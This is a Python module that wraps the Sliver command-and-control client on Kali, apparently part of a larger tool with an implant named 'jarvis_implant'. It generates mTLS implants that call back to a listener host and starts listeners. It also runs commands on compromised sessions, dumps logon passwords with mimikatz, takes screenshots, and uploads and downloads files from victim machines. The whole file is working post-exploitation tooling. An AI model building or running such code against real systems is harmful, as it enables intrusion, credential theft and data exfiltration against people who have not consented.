"""
tools_integration/sliver_c2.py - Sliver C2 integration

Sliver: https://github.com/BishopFox/sliver
Uses sliver-client CLI on Kali.
"""

from typing import Dict, List
from rich.console import Console

console = Console()


class SliverC2:
    """Sliver C2 client via sliver-client CLI."""

    def __init__(self, kali=None):
        self.kali = kali
        self.available = False

        if kali and kali.is_ready():
            check = kali.run("command -v sliver-client 2>/dev/null")
            self.available = bool(check.strip())

    def is_ready(self) -> bool:
        return self.available and self.kali and self.kali.is_ready()

    def _run(self, cmd: str, timeout: int = 60) -> str:
        """Execute a sliver-client command."""
        if not self.is_ready():
            return "Sliver not available"
        full = f"sliver-client --rc <(echo '{cmd}')"
        return self.kali.run(full, timeout=timeout)

    # ─── Sessions ─────────────────────────────────────────

    def list_sessions(self) -> List[Dict]:
        result = self._run("sessions")
        sessions = []
        for line in result.splitlines():
            parts = line.split("\t")
            if len(parts) >= 3:
                sessions.append({
                    "id": parts[0].strip(),
                    "transport": parts[1].strip(),
                    "remote": parts[2].strip(),
                })
        return sessions

    def use_session(self, session_id: str, command: str) -> str:
        return self._run(f"use {session_id}; {command}")

    def kill_session(self, session_id: str) -> str:
        return self._run(f"use {session_id}; exit")

    # ─── Implants ─────────────────────────────────────────

    def generate_implant(
        self,
        os_target: str,
        arch: str = "amd64",
        lhost: str = "",
        format_type: str = "exe",
        name: str = "jarvis_implant",
    ) -> Dict:
        if not self.is_ready():
            return {"success": False, "error": "Sliver not available"}

        cmd = (
            f"generate --os {os_target} --arch {arch} "
            f"--mtls {lhost} --format {format_type} --save /tmp/{name}"
        )
        result = self._run(cmd, timeout=120)

        # Download to Windows
        if self.kali:
            local = self.kali.download_file(f"/tmp/{name}.{format_type}")
            return {
                "success": True,
                "local_path": local,
                "output": result[:1000],
            }

        return {"success": False, "error": "Download failed"}

    # ─── Listeners ────────────────────────────────────────

    def start_listener(
        self,
        protocol: str = "mtls",
        lhost: str = "",
        lport: int = 8888,
    ) -> Dict:
        if protocol == "http":
            cmd = f"http --lhost {lhost} --lport {lport}"
        elif protocol == "https":
            cmd = f"https --lhost {lhost} --lport {lport}"
        else:
            cmd = f"mtls --lhost {lhost} --lport {lport}"

        result = self._run(cmd, timeout=30)
        return {"success": "started" in result.lower(), "output": result[:500]}

    def list_listeners(self) -> str:
        return self._run("jobs")

    # ─── Post-Exploitation ─────────────────────────────────

    def run_mimikatz(self, session_id: str) -> str:
        return self._run(
            f"use {session_id}; mimikatz --command sekurlsa::logonpasswords"
        )

    def screenshot(self, session_id: str) -> str:
        return self._run(f"use {session_id}; screenshot")

    def download_file(self, session_id: str, remote_path: str, local_path: str) -> str:
        return self._run(f"use {session_id}; download {remote_path} {local_path}")

    def upload_file(self, session_id: str, local_path: str, remote_path: str) -> str:
        return self._run(f"use {session_id}; upload {local_path} {remote_path}")